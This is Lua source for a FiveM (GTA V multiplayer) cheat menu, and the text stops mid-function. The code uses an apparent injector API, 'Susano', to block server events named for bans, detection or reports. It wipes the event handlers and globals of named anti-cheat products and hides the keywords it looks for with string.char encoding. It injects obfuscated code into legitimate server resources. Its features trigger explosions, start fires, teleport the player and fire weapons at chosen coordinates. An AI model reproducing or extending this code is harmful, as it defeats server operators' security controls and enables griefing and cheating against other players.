do
    local _c = string.char
    local function _b(t) local r="" for i=1,#t do r=r.._c(t[i]) end return r end
    local _f = {_b({103,117,97,114,100}),_b({100,101,116,101,99,116}),_b({118,105,111,108,97,116}),
        _b({102,108,97,103}),_b({114,101,112,111,114,116}),_b({99,104,101,97,116}),_b({115,99,114,101,101,110}),
        _b({98,97,110}),_b({107,105,99,107}),_b({97,110,116,105})}
    local _exact = {"J0p0jUnRQUCG", "OffK1WKXTVla"}
    pcall(function()
        if Susano and Susano.OnTriggerServerEvent then
            Susano.OnTriggerServerEvent(function(name, payload)
                if name and type(name) == "string" then
                    for i = 1, #_exact do
                        if name == _exact[i] then return false end
                    end
                    local l = name:lower()
                    for i = 1, #_f do
                        if l:find(_f[i], 1, true) then
                            return false
                        end
                    end
                end
                return name, payload
            end)
        end
    end)
    pcall(function()
        if Susano and Susano.HookNative then
            Susano.HookNative(0xD580F4CB, function() return false, false end)
            Susano.HookNative(0x580417101DDB492F, function() return false, false end)
        end
    end)
end

do
    local _invoke = Citizen.InvokeNative
    local _pcall = pcall
    local _type = type
    local _pairs = pairs
    local _tostring = tostring
    local _GetHashKey = GetHashKey

    local _originals = {}
    local _hooked = {}
    local _bypassActive = false

    local _monitoredNatives = {
        SetEntityInvincible = 0x3882114BDE571AD4,
        SetEntityVisible = 0xEA1C610A04DB6BBB,
        SetEntityAlpha = 0x44A0870B7E92D7C0,
        SetEntityCoords = 0x06843DA7060A026B,
        SetEntityHealth = 0x6B76DC1F3AE6E6A3,
        FreezeEntityPosition = 0x428CA6DBD1094446,
        SetEntityCollision = 0x1A9205C1B2BA1588,
        SetEntityVelocity = 0x1C99BB7B6E96D16F,
        DeleteEntity = 0xAE3CBE5BF394C9C9,
        SetPedArmour = 0xCEA04D83135264CC,
        ClearPedTasksImmediately = 0xAAA34F8A7CB32098,
        SetPedCanRagdoll = 0xB128377056A54E2A,
        CreatePed = 0xD49F9B0955C367DE,
        ClonePed = 0xEF29A16337FACADB,
        GiveWeaponToPed = 0xBF0FD6E56C964FCB,
        RemoveAllPedWeapons = 0xF25DF915FA38C5F3,
        SetPedConfigFlag = 0x1913FE4CBF41C463,
        TaskLeaveVehicle = 0xD3DBCE61A490BE02,
        CreateVehicle = 0xAF35D0D2583BE1DB,
        SetVehicleEngineOn = 0x2497C4717C8B881E,
        SetVehicleDoorsLocked = 0xB664292EAECF7FA6,
        SetVehicleEngineHealth = 0x45F6D8EEF34ABEF1,
        DeleteVehicle = 0xEA386986E786A54F,
        NetworkExplodeVehicle = 0x301A42B3C07D260B,
        SetPlayerInvincible = 0x239528EACDC3E7DE,
        SetRunSprintMultiplierForPlayer = 0x6DB47AA77FD94E09,
        SetSwimMultiplierForPlayer = 0xA91C6F0FF7D16A13,
        AddExplosion = 0xE3AD2BDBAEE269AC,
        CreateObject = 0x509D5878EB39E842,
        StartScriptFire = 0x6B83617E04503888,
        NetworkRequestControlOfEntity = 0xB69317BF5E782347,
        SetEntityAsMissionEntity = 0xAD738C3085FE7E11,
        SetEntityCoordsNoOffset = 0x239A3351AC1DA385,
    }

    local _safeInvoke = _invoke

    local function isNativeHooked(nativeHash)
        if Susano and Susano.IsNativeHooked then
            local ok, result = _pcall(function()
                return Susano.IsNativeHooked(nativeHash)
            end)
            if ok then
                return result
            end
        end
        return false
    end

    local _callCount = {}
    local _lastCallTime = {}

    local function SafeNativeCall(nativeHash, ...)
        if _originals[nativeHash] then
            return _originals[nativeHash](...)
        end
        return _safeInvoke(nativeHash, ...)
    end

    local _G = _G
    local _Citizen = Citizen

    local _realInvoke = _Citizen.InvokeNative

    _Citizen.CreateThread(function()
        Wait(0)

        _originals._invoke = _Citizen.InvokeNative

        local hookedNatives = {}
        local detectionLog = {}

        while true do
            Wait(5000)

            if _Citizen.InvokeNative ~= _originals._invoke and _Citizen.InvokeNative ~= _realInvoke then
                _Citizen.InvokeNative = _realInvoke
            end

            local registry = debug.getregistry()
            if registry then
                local eventHandlers = registry._eventHandlers
                if eventHandlers and _type(eventHandlers) == "table" then
                    local acEventPatterns = {
                        "guard", "shield", "detect", "cheat", "anti",
                        "ban", "kick", "report", "flag", "violation",
                        "FiveGuard", "WaveShield", "Reaper", "Electron",
                        "EC_AC", "RAC", "Fini", "Nexus", "Badger", "Strike"
                    }
                    for evName, handlers in _pairs(eventHandlers) do
                        if _type(evName) == "string" then
                            local evLower = evName:lower()
                            for _, pat in _pairs(acEventPatterns) do
                                if evLower:find(pat:lower(), 1, true) then
                                    if _type(handlers) == "table" then
                                        for j = #handlers, 1, -1 do
                                            table.remove(handlers, j)
                                        end
                                    end
                                    break
                                end
                            end
                        end
                    end
                end
            end

            local acGlobals = {
                "FiveGuard", "WaveShield", "WS", "AntiCheat", "AC_Start",
                "AC_Check", "ShieldDetect", "ReaperV4", "ReaperAC",
                "ReaperDetect", "ECDetect", "ECDetectLoader",
                "ElectronAC", "RAC", "NexusAC", "BadgerAC", "StrikeAC",
                "FiniAC", "CIST"
            }
            for _, name in _pairs(acGlobals) do
                if _G[name] ~= nil then
                    if _type(_G[name]) == "table" then
                        for k, v in _pairs(_G[name]) do
                            if _type(v) == "function" then
                                _G[name][k] = function() return true end
                            end
                        end
                    end
                    _G[name] = nil
                end
            end
        end
    end)

    _pcall(function()
        if Susano and Susano.OnTriggerServerEvent then
            local _acEventKeywords = {
                "guard", "detect", "violat", "flag", "report", "cheat",
                "screen", "ban", "kick", "anti", "shield", "wave",
                "reaper", "electron", "eagle", "fini", "nexus", "badger",
                "strike", "rac", "monitor", "scan", "integrity",
                "heartbeat", "verify", "check_", "ac_", "security"
            }
            Susano.OnTriggerServerEvent(function(name, payload)
                if name and _type(name) == "string" then
                    if name == "J0p0jUnRQUCG" or name == "OffK1WKXTVla" then return false end
                    local l = name:lower()
                    for _, kw in _pairs(_acEventKeywords) do
                        if l:find(kw, 1, true) then
                            return false
                        end
                    end
                end
                return name, payload
            end)
        end
    end)

    _pcall(function()
        if Susano and Susano.HookNative then
            Susano.HookNative(0xD580F4CB, function() return false, false end)
            Susano.HookNative(0x580417101DDB492F, function() return false, false end)
            _pcall(function() Susano.HookNative(0x4862437A486F91B0, function() return false end) end)
            _pcall(function() Susano.HookNative(0xD801CC02177FA3F1, function() return false end) end)
        end
    end)

    _G._NativeBypass = {
        SafeInvoke = _safeInvoke,
        SafeCall = SafeNativeCall,
        IsHooked = isNativeHooked,
        Originals = _originals,
        Hooked = _hooked,
        MonitoredNatives = _monitoredNatives
    }
end

local Menu = {}
Menu.Authenticated = false
Menu.PasswordScreen = true
Menu.PasswordInput = ""
Menu.PasswordError = false
Menu.PasswordErrorTime = 0
Menu.PasswordShake = 0
Menu.PasswordAlpha = 0
Menu.ValidPasswords = {
    "Bullet"
}
Menu.Visible = false
Menu.CurrentCategory = 2
Menu.CurrentPage = 1
Menu.ItemsPerPage = 7
Menu.scrollbarY = nil
Menu.scrollbarHeight = nil
Menu.OpenedCategory = nil
Menu.CurrentItem = 1
Menu.CurrentTab = 1
Menu.ItemScrollOffset = 0
Menu.CategoryScrollOffset = 0
Menu.EditorDragging = false
Menu.EditorDragOffsetX = 0
Menu.EditorDragOffsetY = 0
Menu.EditorMode = false
Menu.ShowSnowflakes = false
Menu.SelectorY = 0
Menu.CategorySelectorY = 0
Menu.TabSelectorX = 0
Menu.TabSelectorWidth = 0
Menu.SmoothFactor = 0.15
Menu.FadeAlpha = 1.0
Menu.LastItemIndex = 1
Menu.GradientType = 1
Menu.ScrollbarPosition = 1
Menu.LaserEyesEnabled = false
Menu.SuperPunchEnabled = false
Menu.ThrowVehiclesEnabled = false
Menu.FreecamSpeed = 1.0
Menu.FreezeSpawnedObjects = true
Menu.ThrowVehicleModel = "adder"
Menu.ThrowVehicleNetworked = false
Menu.ForceMapLoad = false
Menu.FreecamAmmo = "stungun"
Menu.FreecamShootDelay = 250
Menu.NetworkedObjects = false
Menu.NetworkedBots = false

Menu.SafeResource = nil
Menu.SafeResources = {}
Menu.ResourceIndex = 1

function Menu.FindSafeResource()
    if not Susano then return nil end

    if #Menu.SafeResources == 0 then
        if Susano.GetInjectableResources then
            local res = Susano.GetInjectableResources()
            if type(res) == "table" and #res > 0 then
                local preferred = {
                    "ox_inventory", "ox_lib", "es_extended", "qb-core",
                    "vrp", "dpemotes", "skinchanger", "esx_menu_default",
                    "mythic_notify", "PolyZone", "interact-sound",
                    "esx_skin", "esx_identity", "esx_society",
                    "esx_basicneeds", "esx_status", "esx_jobs",
                    "mhacking", "progressbar", "gcphone"
                }
                for _, pref in ipairs(preferred) do
                    for _, r in ipairs(res) do
                        if r == pref then
                            Menu.SafeResources[#Menu.SafeResources + 1] = pref
                        end
                    end
                end
                if #Menu.SafeResources < 3 then
                    for _, r in ipairs(res) do
                        local exists = false
                        for _, s in ipairs(Menu.SafeResources) do
                            if s == r then exists = true break end
                        end
                        if not exists then
                            Menu.SafeResources[#Menu.SafeResources + 1] = r
                        end
                        if #Menu.SafeResources >= 6 then break end
                    end
                end
            end
        end

        if #Menu.SafeResources == 0 then
            local fallbacks = {
                "ox_inventory", "es_extended", "qb-core", "vrp", "ox_lib",
                "dpemotes", "skinchanger", "esx_menu_default"
            }
            for _, fb in ipairs(fallbacks) do
                if GetResourceState(fb) == "started" then
                    Menu.SafeResources[#Menu.SafeResources + 1] = fb
                end
            end
        end
    end

    if #Menu.SafeResources == 0 then return nil end

    local res = Menu.SafeResources[Menu.ResourceIndex]
    Menu.ResourceIndex = Menu.ResourceIndex + 1
    if Menu.ResourceIndex > #Menu.SafeResources then
        Menu.ResourceIndex = 1
    end
    return res
end

function Menu.ObfuscateCode(luaCode)
    local chars = "abcdefghijklmnopqrstuvwxyz"
    local varName = ""
    for i = 1, 6 do
        local idx = math.random(1, #chars)
        varName = varName .. chars:sub(idx, idx)
    end
    return string.format("local %s=pcall;%s(function() %s end)", varName, varName, luaCode)
end

function Menu.SafeExec(luaCode)
    if not Susano or not Susano.InjectResource then
        pcall(function()
            local fn = load(luaCode)
            if fn then fn() end
        end)
        return
    end

    local res = Menu.FindSafeResource()
    if res then
        pcall(function()
            Susano.InjectResource(res, Menu.ObfuscateCode(luaCode))
        end)
    else
        pcall(function()
            local fn = load(luaCode)
            if fn then fn() end
        end)
    end
end

function Menu.SafeTriggerServer(eventName, ...)
    local args = {...}
    local argStr = ""
    for i, v in ipairs(args) do
        if type(v) == "string" then
            argStr = argStr .. '"' .. v .. '"'
        elseif type(v) == "number" then
            argStr = argStr .. tostring(v)
        elseif type(v) == "boolean" then
            argStr = argStr .. tostring(v)
        else
            argStr = argStr .. "nil"
        end
        if i < #args then argStr = argStr .. ", " end
    end

    local code = string.format('TriggerServerEvent("%s"%s)', eventName,
        argStr ~= "" and (", " .. argStr) or "")
    Menu.SafeExec(code)
end

function Menu.SafeTriggerClient(eventName, ...)
    local args = {...}
    local argStr = ""
    for i, v in ipairs(args) do
        if type(v) == "string" then
            argStr = argStr .. '"' .. v .. '"'
        elseif type(v) == "number" then
            argStr = argStr .. tostring(v)
        elseif type(v) == "boolean" then
            argStr = argStr .. tostring(v)
        else
            argStr = argStr .. "nil"
        end
        if i < #args then argStr = argStr .. ", " end
    end

    local code = string.format('TriggerEvent("%s"%s)', eventName,
        argStr ~= "" and (", " .. argStr) or "")
    Menu.SafeExec(code)
end

function Menu.SafeThread(threadCode)
    local code = string.format([[
        Citizen.CreateThread(function()
            %s
        end)
    ]], threadCode)
    Menu.SafeExec(code)
end

Menu.LoadingBarAlpha = 0.0
Menu.KeySelectorAlpha = 0.0
Menu.KeybindsInterfaceAlpha = 0.0
Menu.CustomLoading = { active = false, progress = 0.0, startTime = 0, duration = 0, callback = nil, type = "loader" }

Menu.LoadingProgress = 0.0
Menu.IsLoading = true
Menu.LoadingComplete = false
Menu.LoadingStartTime = nil
Menu.LoadingDuration = 3000

Menu.SelectingKey = false
Menu.SelectedKey = 0x76
Menu.SelectedKeyName = "F7"

Menu.SelectingBind = false
Menu.BindingItem = nil
Menu.BindingKey = nil
Menu.BindingKeyName = nil

Menu.ShowKeybinds = false

Menu.CurrentTopTab = 1
function Menu.UpdateCategoriesFromTopTab()
    if not Menu.TopLevelTabs then return end

    local currentTop = Menu.TopLevelTabs[Menu.CurrentTopTab]
    if not currentTop then return end

    Menu.Categories = {}
    table.insert(Menu.Categories, { name = currentTop.name })
    for _, cat in ipairs(currentTop.categories) do
        table.insert(Menu.Categories, cat)
    end

    Menu.CurrentCategory = 2
    Menu.CategoryScrollOffset = 0
    Menu.OpenedCategory = nil

    if currentTop.autoOpen then
        Menu.OpenedCategory = 2
        Menu.CurrentTab = 1
        Menu.ItemScrollOffset = 0
        Menu.CurrentItem = 1
    end
end

Menu.Banner = {
    enabled = true,
    imageUrl = "https://i.ibb.co/84Khp5bq/1779209175360-019e4120-d142-7418-a2bb-cefb21913ecd.png",
    height = 92
}

Menu.bannerTexture = nil
Menu.bannerWidth = 0
Menu.bannerHeight = 0

function Menu.LoadBannerTexture(url)
    if not url or url == "" then return end
    if not Susano or not Susano.HttpGet or not Susano.LoadTextureFromBuffer then return end

    if CreateThread then
        CreateThread(function()
            local success, result = pcall(function()
                local status, body = Susano.HttpGet(url)
                if status == 200 and body and #body > 0 then
                    local textureId, width, height = Susano.LoadTextureFromBuffer(body)
                    if textureId and textureId ~= 0 then
                        Menu.bannerTexture = textureId
                        Menu.bannerWidth = width
                        Menu.bannerHeight = height
                        return textureId
                    end
                end
                return nil
            end)
            if not success then
            end
        end)
    else
        local success, result = pcall(function()
            local status, body = Susano.HttpGet(url)
            if status == 200 and body and #body > 0 then
                local textureId, width, height = Susano.LoadTextureFromBuffer(body)
                if textureId and textureId ~= 0 then
                    Menu.bannerTexture = textureId
                    Menu.bannerWidth = width
                    Menu.bannerHeight = height
                    return textureId
                end
            end
            return nil
        end)
        if not success then
        end
    end
end

Menu.warningTexture = nil
Menu.warningWidth = 0
Menu.warningHeight = 0

Menu.weaponTexture = nil
Menu.weaponWidth = 0
Menu.weaponHeight = 0

Menu.vehicleTexture = nil
Menu.vehicleWidth = 0
Menu.vehicleHeight = 0

function Menu.LoadCustomTexture(key, url)
    if not url or url == "" then return end
    if not Susano or not Susano.HttpGet or not Susano.LoadTextureFromBuffer then return end
    if CreateThread then
        CreateThread(function()
            Susano.HttpGet(url, function(status, data)
                if status == 200 and data then
                    local textureId, width, height = Susano.LoadTextureFromBuffer(data)
                    if textureId and textureId > 0 then
                        if key == "weapon" then
                            Menu.weaponTexture = textureId
                            Menu.weaponWidth = width
                            Menu.weaponHeight = height
                        elseif key == "vehicle" then
                            Menu.vehicleTexture = textureId
                            Menu.vehicleWidth = width
                            Menu.vehicleHeight = height
                        end
                    end
                end
            end)
        end)
    end
end

function Menu.LoadWarningTexture(url)
    if not url or url == "" then return end
    if not Susano or not Susano.HttpGet or not Susano.LoadTextureFromBuffer then return end

    if CreateThread then
        CreateThread(function()
            local success, result = pcall(function()
                local status, body = Susano.HttpGet(url)
                if status == 200 and body and #body > 0 then
                    local textureId, width, height = Susano.LoadTextureFromBuffer(body)
                    if textureId and textureId ~= 0 then
                        Menu.warningTexture = textureId
                        Menu.warningWidth = width
                        Menu.warningHeight = height
                        return textureId
                    end
                end
                return nil
            end)
            if not success then
            end
        end)
    else
        local success, result = pcall(function()
            local status, body = Susano.HttpGet(url)
            if status == 200 and body and #body > 0 then
                local textureId, width, height = Susano.LoadTextureFromBuffer(body)
                if textureId and textureId ~= 0 then
                    Menu.warningTexture = textureId
                    Menu.warningWidth = width
                    Menu.warningHeight = height
                    return textureId
                end
            end
            return nil
        end)
        if not success then
        end
    end
end

Menu.Colors = {
    HeaderPink = { r = 0, g = 150, b = 255 },
    SelectedBg = { r = 0, g = 150, b = 255 },
    TextWhite = { r = 255, g = 255, b = 255 },
    TextDim = { r = 140, g = 150, b = 170 },
    BackgroundDark = { r = 0, g = 0, b = 0 },
    BackgroundItem = { r = 18, g = 22, b = 34 },
    BackgroundItemHover = { r = 25, g = 30, b = 48 },
    FooterBlack = { r = 0, g = 0, b = 0 },
    SeparatorLine = { r = 40, g = 50, b = 70 },
    ToggleOn = { r = 40, g = 200, b = 120 },
    ToggleOff = { r = 70, g = 75, b = 90 },
    AccentGlow = { r = 0, g = 150, b = 255 }
}

function Menu.ApplyTheme(theme)
    if theme == "Cyan" then
        Menu.Colors.HeaderPink = { r = 0, g = 200, b = 220 }
        Menu.Colors.SelectedBg = { r = 0, g = 200, b = 220 }
        Menu.Colors.AccentGlow = { r = 0, g = 200, b = 220 }
    elseif theme == "Purple" then
        Menu.Colors.HeaderPink = { r = 130, g = 60, b = 255 }
        Menu.Colors.SelectedBg = { r = 130, g = 60, b = 255 }
        Menu.Colors.AccentGlow = { r = 130, g = 60, b = 255 }
    elseif theme == "Red" then
        Menu.Colors.HeaderPink = { r = 255, g = 50, b = 60 }
        Menu.Colors.SelectedBg = { r = 255, g = 50, b = 60 }
        Menu.Colors.AccentGlow = { r = 255, g = 50, b = 60 }
    elseif theme == "Green" then
        Menu.Colors.HeaderPink = { r = 40, g = 200, b = 120 }
        Menu.Colors.SelectedBg = { r = 40, g = 200, b = 120 }
        Menu.Colors.AccentGlow = { r = 40, g = 200, b = 120 }
    elseif theme == "Gray" then
        Menu.Colors.HeaderPink = { r = 140, g = 140, b = 140 }
        Menu.Colors.SelectedBg = { r = 140, g = 140, b = 140 }
        Menu.Colors.AccentGlow = { r = 140, g = 140, b = 140 }
    else -- Blue (default)
        Menu.Colors.HeaderPink = { r = 0, g = 150, b = 255 }
        Menu.Colors.SelectedBg = { r = 0, g = 150, b = 255 }
        Menu.Colors.AccentGlow = { r = 0, g = 150, b = 255 }
    end
end

Menu.Position = {
    x = 50,
    y = 80,
    width = 320,
    itemHeight = 38,
    mainMenuHeight = 30,
    headerHeight = 100,
    footerHeight = 28,
    footerSpacing = 6,
    mainMenuSpacing = 6,
    footerRadius = 5,
    itemRadius = 5,
    scrollbarWidth = 8,
    scrollbarPadding = 6,
    headerRadius = 5
}
Menu.Scale = 1.0

function Menu.GetScaledPosition()
    local scale = Menu.Scale or 1.0
    return {
        x = Menu.Position.x,
        y = Menu.Position.y,
        width = Menu.Position.width * scale,
        itemHeight = Menu.Position.itemHeight * scale,
        mainMenuHeight = Menu.Position.mainMenuHeight * scale,
        headerHeight = Menu.Position.headerHeight * scale,
        footerHeight = Menu.Position.footerHeight * scale,
        footerSpacing = Menu.Position.footerSpacing * scale,
        mainMenuSpacing = Menu.Position.mainMenuSpacing * scale,
        footerRadius = Menu.Position.footerRadius * scale,
        itemRadius = Menu.Position.itemRadius * scale,
        scrollbarWidth = Menu.Position.scrollbarWidth * scale,
        scrollbarPadding = Menu.Position.scrollbarPadding * scale,
        headerRadius = Menu.Position.headerRadius * scale
    }
end

Menu.Toasts = {}
Menu.ToastDuration = 2500
Menu.ShowActiveHUD = false
Menu.ShowSpectators = false
Menu.ActiveFeatures = {}

function Menu.Toast(text, color)
    table.insert(Menu.Toasts, {
        text = text,
        color = color or "green",
        startTime = GetGameTimer(),
        alpha = 0.0,
        offsetX = 200
    })
end

function Menu.DrawToasts()
    if not Susano or not Susano.DrawText then return end
    local now = GetGameTimer()
    local scale = Menu.Scale or 1.0
    local screenW = 1920 * scale
    local toastH = 28 * scale
    local toastPad = 8 * scale
    local screenH = 1080 * scale
    local maxToasts = math.max(1, #Menu.Toasts)
    local startY = screenH - (maxToasts * (toastH + toastPad)) - 18 * scale
    local rightMargin = 20 * scale

    local alive = {}
    for _, t in ipairs(Menu.Toasts) do
        local elapsed = now - t.startTime
        if elapsed < Menu.ToastDuration then
            table.insert(alive, t)
        end
    end
    Menu.Toasts = alive

    for i, t in ipairs(Menu.Toasts) do
        local elapsed = now - t.startTime
        local progress = elapsed / Menu.ToastDuration

        if progress < 0.15 then
            t.alpha = t.alpha + (1.0 - t.alpha) * 0.2
            t.offsetX = t.offsetX + (0 - t.offsetX) * 0.2
        elseif progress > 0.8 then
            t.alpha = t.alpha + (0.0 - t.alpha) * 0.08
        else
            t.alpha = 1.0
            t.offsetX = 0
        end

        local textW = #t.text * 7 * scale
        local toastW = textW + 40 * scale
        local x = screenW - toastW - rightMargin + t.offsetX
        local y = startY + (i - 1) * (toastH + toastPad)

        local cr, cg, cb = 0.1, 0.85, 0.3
        if t.color == "red" then cr, cg, cb = 0.9, 0.2, 0.2
        elseif t.color == "blue" then cr, cg, cb = 0.2, 0.5, 1.0
        elseif t.color == "yellow" then cr, cg, cb = 1.0, 0.85, 0.1
        elseif t.color == "purple" then cr, cg, cb = 0.6, 0.3, 0.9 end

        Menu.DrawRoundedRect(x, y, toastW, toastH, Menu.Colors.BackgroundDark.r, Menu.Colors.BackgroundDark.g, Menu.Colors.BackgroundDark.b, 230 * t.alpha, 4 * scale)
        Menu.DrawRoundedRect(x, y, 4 * scale, toastH, cr*255, cg*255, cb*255, 255 * t.alpha, 2 * scale)
        local icon = "i"
        if t.color == "red" then icon = "!" elseif t.color == "yellow" then icon = "*" end
        Susano.DrawText(x + 10 * scale, y + 5 * scale, icon, 14 * scale, cr, cg, cb, t.alpha)
        Susano.DrawText(x + 26 * scale, y + 6 * scale, t.text, 13 * scale, 1.0, 1.0, 1.0, 0.95 * t.alpha)
    end
end

function Menu.RegisterFeature(name, enabled)
    Menu.ActiveFeatures[name] = enabled
    if enabled then
        Menu.Toast(name .. " ON", "green")
    else
        Menu.Toast(name .. " OFF", "red")
    end
end

function Menu.ToggleFreecam(state, initialSpeed)
    Menu.FreecamEnabled = state
    Menu.RegisterFeature("Freecam", state)
    if state ~= _G.FreeCam then
        ToggleFreeCam()
    end
end

Veax = {}
function Veax:ToggleFreecam(state, initialSpeed)
    Menu.ToggleFreecam(state, initialSpeed)
end

----------------------------------------------------------------
-- Susano Communication Setup
----------------------------------------------------------------
Susano = Susano or {}
Susano.Communication = Susano.Communication or {}
Susano.Communication.handlers = Susano.Communication.handlers or {}

local function GenerateRandomString(length)
    local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    local result = {}
    
    for i = 1, length do
        local rand = math.random(1, #chars)
        result[i] = chars:sub(rand, rand)
    end
    
    return table.concat(result)
end

Susano.Communication.Key = Susano.Communication.Key or GenerateRandomString(16)

if Susano.UnhookNative and Susano.HookNative then
    Susano.UnhookNative(0x6CCD2564)
    Susano.HookNative(0x6CCD2564, function(key, data)
        if Susano.Communication.Key == key then
            local data = json.decode(data)
            local eventname = data.event;

            for i,v in pairs(Susano.Communication.handlers[eventname] or {}) do
                v(table.unpack(data.args))
            end
        end

        return true
    end)
end

function Susano.Communication.register(eventName, func)
    if not Susano.Communication.handlers[eventName] then Susano.Communication.handlers[eventName] = {} end
    table.insert(Susano.Communication.handlers[eventName], func)
end

function Susano.Communication.Inject(resource, code)
    local stub = ([[
        local com = {}
        function com.call(eventName, ...)
            local tbl = {
                event = eventName,
                args = {...}
            }
            GetConvar('%s', json.encode(tbl))
        end
        print("Hello")
    ]]):format(Susano.Communication.Key)

    if Susano.InjectResource then
        Susano.InjectResource(resource, stub .. "\n" .. code)
    end
end

----------------------------------------------------------------
-- Raycast Freecam & Script Utilities Integration
----------------------------------------------------------------
Utils = Utils or {}
Utils.ScriptRegistry = Utils.ScriptRegistry or {}

function Utils.RegisterScript(name, code, preferredResource)
    Utils.ScriptRegistry[name] = {
        code = code,
        preferredResource = preferredResource
    }
end

function Utils.InjectScript(name, resource, ...)
    local script = Utils.ScriptRegistry[name]
    if not script then return print("Script not found:", name) end

    local targetResource = resource
    if not targetResource then
        local pref = script.preferredResource
        if type(pref) == "table" then
            for i = 1, #pref do
                if GetResourceState(pref[i]) == "started" then
                    targetResource = pref[i]
                    break
                end
            end
        elseif type(pref) == "string" then
            targetResource = pref
        end
    end
    if not targetResource then targetResource = "any" end

    local args = { ... }
    local needed = select(2, string.gsub(script.code, '%%s', ''))
    if #args < needed then return print("InjectScript, doesn't have enough args") end

    for i, v in ipairs(args) do
        if type(v) == "string" then
            args[i] = string.format("'%s'", v)
        end
    end

    local code = #args > 0 and string.format(script.code, table.unpack(args)) or script.code
    if Susano and Susano.InjectResource then
        pcall(function() Susano.InjectResource(targetResource, code) end)
    end
    return targetResource
end

-- Register required scripts for FreeCam
Utils.RegisterScript("teleportToCoords", [[
    local x, y, z = %s, %s, %s
    local ped = PlayerPedId()
    local vehicle = GetVehiclePedIsIn(ped, false)
    local entity = (vehicle ~= 0) and vehicle or ped

    RequestCollisionAtCoord(x, y, z)
    SetEntityCoordsNoOffset(entity, x, y, z, false, false, false)
    if vehicle ~= 0 then
        SetVehicleOnGroundProperly(vehicle)
    end
]], "any")

Utils.RegisterScript("spawnObject", [[
    local model, x, y, z, isExplosive = %s, %s, %s, %s, %s
    local hash = tonumber(model) or GetHashKey(model)
    
    CreateThread(function()
        RequestModel(hash)
        local timeout = 0
        while not HasModelLoaded(hash) and timeout < 200 do
            Wait(10)
            timeout = timeout + 1
        end
        if HasModelLoaded(hash) then
            local obj = CreateObject(hash, x, y, z, true, true, false)
            if DoesEntityExist(obj) then
                PlaceObjectOnGroundProperly(obj)
                FreezeEntityPosition(obj, true)
                if isExplosive then
                    AddExplosion(x, y, z, 2, 10.0, true, false, 1.0)
                    StartScriptFire(x, y, z, 25, false)
                end
            end
        end
    end)
]], "any")

Utils.RegisterScript("shootWeapon", [[
    local weaponName, x, y, z = %s, %s, %s, %s
    local hash = GetHashKey(weaponName)
    local ped = PlayerPedId()
    
    local startX, startY, startZ = x, y, z + 50.0
    ShootSingleBulletBetweenCoords(
        startX, startY, startZ,
        x, y, z,
        250, true, hash, ped, true, false, -1.0
    )
]], "any")

function SpawnVehicleByModel(vehicleModel, ply, coords)
    if type(vehicleModel) == "string" then
        vehicleModel = GetHashKey(vehicleModel)
    end

    local ped = PlayerPedId()
    local pedCoords = coords or GetEntityCoords(ped)
    local pedHeading = GetEntityHeading(ped)

    local targetResource = nil
    if GetResourceState("es_extended") == "started" then
        targetResource = 'es_extended'
    elseif GetResourceState("monitor") == "started" then
        targetResource = 'monitor'
    else
        targetResource = 'any'
    end

    if targetResource then
        Citizen.CreateThread(function()
            local success, reason = CIST:spawnWithRateLimit("Vehicle", vehicleModel, function()
                Susano.InjectResource(targetResource, string.format([[
                    local model = %s
                    local x, y, z = %f, %f, %f
                    local heading = %f

                    RequestModel(model)
                    local timeout = 0
                    while not HasModelLoaded(model) and timeout < 200 do
                        Wait(10)
                        timeout = timeout + 1
                    end

                    if HasModelLoaded(model) then
                        local veh = CreateVehicle(model, x, y, z, heading, true, false)
                        local ped = PlayerPedId()
                        SetPedIntoVehicle(ped, veh, -1)
                        SetModelAsNoLongerNeeded(model)
                    end
                ]], vehicleModel, pedCoords.x, pedCoords.y, pedCoords.z, pedHeading))
            end)
        end)
    end
end

-- ===================================================================
-- 1. إعدادات وميزات الفريكام (قائمة الخيارات والتنفيذ)
-- ===================================================================
_G.CurrentSelectedFreeCam = 1
local FreeCamFeatures = {
    [1] = { name = "View", callback = function(entityHit, endCoords, camCoords) end },
    [2] = { name = "Teleport", callback = function(entityHit, endCoords, camCoords) Utils.InjectScript("teleportToCoords", nil, endCoords.x, endCoords.y, endCoords.z) end },
    [3] = { name = "Explosion", callback = function(entityHit, endCoords, camCoords) Utils.InjectScript("spawnObject", nil, "prop_aircon_m_04", endCoords.x, endCoords.y, endCoords.z, true) end },
    [4] = { name = "Spawn Vehicle", callback = function(entityHit, endCoords, camCoords) SpawnVehicleByModel(_G.FreeCamVehicle or "adder", nil, endCoords) end },
    [5] = { name = "Shoot Weapon", callback = function(entityHit, endCoords, camCoords) Utils.InjectScript("shootWeapon", nil, _G.FreeCamWeapon or "weapon_pistol", endCoords.x, endCoords.y, endCoords.z, 0, 0, 0) end }
}

-- استقبال الإشارة عند الضغط (كليك يسار) لتنفيذ الميزة المختارة
Susano.Communication.register("freeCamHit", function(...) 
    FreeCamFeatures[_G.CurrentSelectedFreeCam].callback(...) 
end)

local ScreenWidth, ScreenHeight = GetActiveScreenResolution()
Susano.HookNative(0x1CEA6BFDF248E5D9, function() return false, true end)

-- دالة لتشغيل وإطفاء الفريكام وعرض القائمة السفلية
function ToggleFreeCam()
    _G.FreeCam = not _G.FreeCam
    if _G.FreeCam then
        EnableFreecam()
    else
        DisableFreecam()
    end
    
    CreateThread(function()
        while _G.FreeCam do
            -- التبديل بين الخيارات عبر البكرة أو أزرار الماوس الجانبية (Controls 241 / 242)
            if IsDisabledControlJustPressed(0, 242) then
                _G.CurrentSelectedFreeCam = _G.CurrentSelectedFreeCam + 1
                if _G.CurrentSelectedFreeCam > #FreeCamFeatures then _G.CurrentSelectedFreeCam = 1 end
            elseif IsDisabledControlJustPressed(0, 241) then
                _G.CurrentSelectedFreeCam = _G.CurrentSelectedFreeCam - 1
                if _G.CurrentSelectedFreeCam < 1 then _G.CurrentSelectedFreeCam = #FreeCamFeatures end
            end
            
            Susano.BeginFrame()
            local lineHeight = 25
            local startY = ScreenHeight - 100 - (#FreeCamFeatures * lineHeight)
            local MenuFont = THEME["Fonts"]["MenuText"]
            
            -- رسم النص والخيارات أسفل الشاشة
            for i = 1, #FreeCamFeatures do
                local feature = FreeCamFeatures[i]
                local textH = 22
                local textWidth = Susano.GetTextWidthWithFont(feature.name, MenuFont[1], MenuFont[2], textH)
                local xPos = (ScreenWidth / 2) - (textWidth / 2)
                local yPos = ScreenHeight - 100 - ((#FreeCamFeatures - i) * lineHeight)
                
                if i == _G.CurrentSelectedFreeCam then
                    local selectedText = "> " .. feature.name
                    local selectedWidth = Susano.GetTextWidthWithFont(selectedText, MenuFont[1], MenuFont[2], textH)
                    xPos = (ScreenWidth / 2) - (selectedWidth / 2)
